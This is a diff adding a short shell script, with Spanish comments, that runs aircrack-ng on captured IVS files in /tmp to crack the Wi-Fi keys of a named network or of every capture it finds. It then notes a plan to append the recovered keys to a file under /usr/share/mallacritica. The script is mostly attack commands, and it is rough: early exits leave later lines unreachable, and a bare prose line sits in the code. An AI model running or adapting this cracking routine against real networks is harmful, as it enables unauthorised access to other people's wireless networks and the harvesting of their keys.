@@ -1,0 +1,20 @@
+#!/bin/sh
+#
+#	rompe los IVS
+#
+
+# rompe una red por SSID
+aircrack-ng -s /tmp/capture-0* -q -e $SSID
+
+exit
+
+find /tmp -iname "*ivs" | while read IVS; do
+	echo $IVS
+	aircrack-ng $IVS
+
+done
+
+exit
+
+La idea de este es tomar las claves y copiarlas en /usr/share/mallacritica/claves
+echo "$SSID\t$KEY" >> /usr/share/mallacritica/claves
